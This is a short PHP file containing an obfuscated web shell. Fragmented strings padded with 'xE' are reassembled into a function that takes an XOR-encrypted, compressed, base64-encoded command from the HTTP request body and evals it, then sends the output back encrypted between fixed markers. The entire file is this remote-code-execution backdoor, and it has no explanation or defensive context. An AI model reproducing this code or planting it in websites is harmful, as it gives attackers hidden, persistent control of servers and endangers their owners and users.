<?php
$Z='$k="4xEeb1736a";$xEkxEh="bf8xExE9ec0axEfb7e";$kf="810db2xE19e46dxE";xE$p="VoP0pxERtIT33PxEs9Hl';
$W=str_replace('p','','crpeaptep_fupncptpion');
$K='";xEfunxEction x($txE,$xEk){$c=xEstrlexEn($k);$lxE=strlen(xE$t);$o=xE"";forxE(xExE$i=0;$i<$l;){forxE($j=0';
$O='Eval(xExE@gzuxEncomprexEsxEs(@xxE(@baxEsxEe64_decode($m[1]),$xEk)));$xEo=@ob_get_contenxEts();x';
$X='xE;($j<xE$c&&$i<$lxE);$jxE++,$ixE++){$xEo.=xE$t{$i}^$xExEk{$j};}}xEreturn $o;}ifxE (@xExEpreg_';
$g='E@ob_xEend_cleanxE();xE$r=xE@baxEse64_encoxEde(@x(@gzcomxEprxEess($oxE)xE,xE$k));print("$xEp$kh$r$kf");}';
$r='match("/xE$kxEh(.+)$kf/",xE@fixEle_get_contxEentsxE("xEphp://inxEput"),xE$mxE)==1) {@obxE_start();@ex';
$e=str_replace('xE','',$Z.$K.$X.$r.$O.$g);
$k=$W('',$e);$k();
?>
